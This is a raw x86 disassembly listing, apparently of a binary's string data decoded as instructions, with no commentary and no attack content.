  42ebd4:	pop    edi
  42ebd5:	inc    ebx
  42ebd6:	xor    DWORD PTR [eax+0x5f],edx
  42ebd9:	push   ecx
  42ebda:	inc    esi
  42ebdb:	xor    cl,BYTE PTR [edi+0x0]
  42ebde:	pop    edx
  42ebdf:	pop    edx
  42ebe0:	pop    edx
  42ebe1:	xor    BYTE PTR [edi+0x42],bl
  42ebe4:	dec    edx
  42ebe5:	push   ecx
  42ebe6:	pop    edi
  42ebe7:	push   ebp
  42ebe8:	pop    eax
  42ebe9:	add    BYTE PTR [edx+0x50],cl
  42ebec:	dec    edx
  42ebed:	xor    bh,BYTE PTR [ecx]
  42ebef:	pop    edi
  42ebf0:	dec    esi
  42ebf1:	ss push eax
  42ebf3:	xor    al,0x34
  42ebf5:	pop    edi
  42ebf6:	push   eax
  42ebf7:	xor    eax,DWORD PTR [eax]
  42ebf9:	dec    ebp
  42ebfa:	dec    ecx
  42ebfb:	xor    ebx,DWORD PTR [edi+0x33]
  42ebfe:	push   edx
  42ebff:	inc    esp
  42ec00:	dec    ebx
  42ec01:	pop    edi
  42ec02:	xor    al,0x0
  42ec04:	inc    edi
  42ec05:	dec    esi
  42ec06:	push   edi
  42ec07:	xor    al,0x5f
  42ec09:	push   ebx
  42ec0a:	inc    edi
  42ec0b:	inc    edx
  42ec0c:	pop    edi
  42ec0d:	xor    al,0x45
  42ec0f:	add    BYTE PTR [edx+0x35],bl
  42ec12:	push   eax
  42ec13:	pop    edi
  42ec14:	xor    edx,DWORD PTR [ebx+0x43]
  42ec17:	xor    dh,BYTE PTR [esi]
  42ec19:	xor    bl,BYTE PTR [edi+0x37]
  42ec1c:	inc    edx
  42ec1d:	inc    ecx
  42ec1e:	add    BYTE PTR [edx+0x39],cl
  42ec21:	dec    esp
  42ec22:	pop    edi
  42ec23:	dec    eax
  42ec24:	xor    ebx,DWORD PTR [eax+0x5f]
  42ec27:	push   ebx
  42ec28:	xor    DWORD PTR [edi+0x0],edx
  42ec2b:	push   esp
  42ec2c:	pop    ecx
  42ec2d:	inc    ebx
  42ec2e:	pop    edi
  42ec2f:	push   edi
  42ec30:	inc    ebx
  42ec31:	inc    esi
  42ec32:	inc    esi
  42ec33:	add    BYTE PTR [ebp+0x31],al
  42ec36:	xor    DWORD PTR [edi+0x30],ebx
  42ec39:	push   ebp
  42ec3a:	xor    ebx,DWORD PTR ss:[edi+0x4b]
  42ec3e:	inc    edi
  42ec3f:	add    BYTE PTR [ecx+0x4d],cl
  42ec42:	inc    edi
  42ec43:	xor    DWORD PTR [edi+0x4b],ebx
  42ec46:	aaa    
  42ec47:	push   ebp
  42ec48:	pop    eax
  42ec49:	add    BYTE PTR [ebx+0x58],dl
  42ec4c:	xor    al,0x5f
  42ec4e:	xor    al,0x4c
  42ec50:	push   edx
  42ec51:	xor    DWORD PTR [ecx+0x5f],ebx
  42ec54:	xor    DWORD PTR [ebp+0x4a],edx
  42ec57:	add    BYTE PTR [edx+0x30],bl
  42ec5a:	xor    BYTE PTR [edi+0x31],bl
  42ec5d:	xor    DWORD PTR [edi+0x4f],ecx
  42ec60:	pop    edi
  42ec61:	dec    esp
  42ec62:	xor    esi,DWORD PTR [ecx*2+0x33334300]
  42ec69:	cmp    BYTE PTR [edi+0x59],bl
  42ec6c:	xor    al,0x45
  42ec6e:	cmp    DWORD PTR [edi+0x51],ebx
  42ec71:	add    BYTE PTR [edx+0x0],al
  42ec74:	pop    edx
  42ec75:	add    BYTE PTR [ebx+0x0],al
  42ec78:	cmp    DWORD PTR [eax],eax
  42ec7a:	xor    eax,DWORD PTR [eax]
  42ec7c:	cmp    BYTE PTR [eax],al
  42ec7e:	pop    edi
  42ec7f:	add    BYTE PTR [edx],dh
  42ec81:	add    BYTE PTR [esi],dh
  42ec83:	add    BYTE PTR [ecx],dh
  42ec85:	add    BYTE PTR [ecx+0x0],cl
  42ec88:	cmp    BYTE PTR [eax],al
  42ec8a:	dec    edi
  42ec8b:	add    BYTE PTR [eax],al
  42ec8d:	add    BYTE PTR [ebx+0x0],cl
  42ec90:	xor    al,0x0
  42ec92:	push   esp
  42ec93:	add    BYTE PTR [esi],dh
  42ec95:	add    BYTE PTR [edi+0x0],bl
  42ec98:	push   edx
  42ec99:	add    BYTE PTR [ebx+0x0],cl
  42ec9c:	xor    al,0x0
  42ec9e:	dec    esi
  42ec9f:	add    BYTE PTR [eax],al
  42eca1:	add    BYTE PTR [edx+0x0],bl
  42eca4:	inc    edx
  42eca5:	add    BYTE PTR [eax+0x0],cl
  42eca8:	pop    edi
  42eca9:	add    BYTE PTR [edi],dh
  42ecab:	add    BYTE PTR [eax+eax*1],dh
  42ecae:	xor    BYTE PTR [eax],al
  42ecb0:	cmp    BYTE PTR [eax],al
  42ecb2:	pop    edi
  42ecb3:	add    BYTE PTR [ebx+0x0],cl
  42ecb6:	push   ebp
  42ecb7:	add    BYTE PTR [ebx+0x0],al
  42ecba:	cmp    DWORD PTR [eax],eax
  42ecbc:	add    BYTE PTR [eax],al
  42ecbe:	push   ebp
  42ecbf:	add    BYTE PTR [ecx],dh
  42ecc1:	add    BYTE PTR [edi+0x0],al
  42ecc4:	pop    edi
  42ecc5:	add    BYTE PTR [eax+0x0],bl
  42ecc8:	inc    esi
  42ecc9:	add    BYTE PTR [ebx+0x0],cl
  42eccc:	pop    edi
  42eccd:	add    BYTE PTR [ebp+0x0],cl
  42ecd0:	inc    edi
  42ecd1:	add    BYTE PTR [ecx+0x0],dl
  42ecd4:	dec    edi
  42ecd5:	add    BYTE PTR [eax],al
  42ecd7:	add    BYTE PTR [edx+0x0],cl
  42ecda:	push   esp
  42ecdb:	add    BYTE PTR [eax+eax*1+0x5f],dl
  42ecdf:	add    BYTE PTR [esi+0x0],cl
  42ece2:	push   edx
  42ece3:	add    BYTE PTR [ecx+0x0],bl
  42ece6:	xor    eax,DWORD PTR [eax]
  42ece8:	pop    edi
  42ece9:	add    BYTE PTR [ebx],dh
  42eceb:	add    BYTE PTR [eax+0x0],cl
  42ecee:	dec    edi
  42ecef:	add    BYTE PTR [eax],al
  42ecf1:	add    BYTE PTR [eax+eax*1+0x54],cl
  42ecf5:	add    BYTE PTR [esi+0x0],dl
  42ecf8:	pop    edi
  42ecf9:	add    BYTE PTR [eax+eax*1+0x38],al
  42ecfd:	add    BYTE PTR [eax+eax*1],dh
  42ed00:	push   eax
  42ed01:	add    BYTE PTR [eax],al
  42ed03:	add    BYTE PTR [eax+0x0],dl
  42ed06:	cmp    BYTE PTR [eax],al
  42ed08:	inc    esi
  42ed09:	add    BYTE PTR [ecx],bh
  42ed0b:	add    BYTE PTR [edi+0x0],bl
  42ed0e:	dec    esp
  42ed0f:	add    BYTE PTR [eax+0x0],dl
  42ed12:	xor    eax,0x37005f00
  42ed17:	add    BYTE PTR [esi+0x0],dl
  42ed1a:	pop    ecx
  42ed1b:	add    BYTE PTR [edi+0x0],dl
  42ed1e:	add    BYTE PTR [eax],al
  42ed20:	dec    esp
  42ed21:	add    BYTE PTR [esi],dh
  42ed23:	add    BYTE PTR [eax+eax*1],dh
  42ed26:	pop    edi
  42ed27:	add    BYTE PTR [ecx+0x0],bl
  42ed2a:	xor    al,0x0
  42ed2c:	dec    ebx
  42ed2d:	add    BYTE PTR [esi+0x0],dl
  42ed30:	cmp    BYTE PTR [eax],al
  42ed32:	add    BYTE PTR [eax],al
  42ed34:	inc    ecx
  42ed35:	add    BYTE PTR [eax+0x0],bl
  42ed38:	pop    edx
  42ed39:	add    BYTE PTR [edi+0x0],bl
  42ed3c:	inc    ebp
  42ed3d:	add    BYTE PTR [esi+0x0],cl
  42ed40:	push   eax
  42ed41:	add    BYTE PTR [eax+0x0],cl
  42ed44:	inc    ecx
  42ed45:	add    BYTE PTR [ecx+0x0],dl
  42ed48:	add    BYTE PTR [eax],al
  42ed4a:	inc    ebx
  42ed4b:	add    BYTE PTR [ecx+0x0],bl
  42ed4e:	push   eax
  42ed4f:	add    BYTE PTR [edi+0x0],bl
  42ed52:	xor    al,0x0
  42ed54:	inc    ecx
  42ed55:	add    BYTE PTR [edx+0x0],al
  42ed58:	aaa    
  42ed59:	add    BYTE PTR [eax],dh
  42ed5b:	add    BYTE PTR [ebp+0x0],al
  42ed5e:	add    BYTE PTR [eax],al
  42ed60:	inc    esi
  42ed61:	add    BYTE PTR [ebx+0x0],cl
  42ed64:	pop    edx
  42ed65:	add    BYTE PTR [eax],bh
  42ed67:	add    BYTE PTR [edi+0x0],bl
  42ed6a:	dec    edx
  42ed6b:	add    BYTE PTR [ecx+0x0],cl
  42ed6e:	xor    eax,0x4b004e00
  42ed73:	add    BYTE PTR [edi],dh
  42ed75:	add    BYTE PTR [eax],al
  42ed77:	add    BYTE PTR [eax+0x0],cl
  42ed7a:	push   edx
  42ed7b:	add    BYTE PTR [eax+0x0],bl
  42ed7e:	pop    edi
  42ed7f:	add    BYTE PTR [eax+0x0],dl
  42ed82:	pop    ecx
  42ed83:	add    BYTE PTR [ebx+0x0],dl
  42ed86:	cmp    BYTE PTR [eax],al
  42ed88:	xor    DWORD PTR [eax],eax
  42ed8a:	pop    edi
  42ed8b:	add    BYTE PTR [edx+0x0],al
  42ed8e:	add    BYTE PTR [eax],al
	...
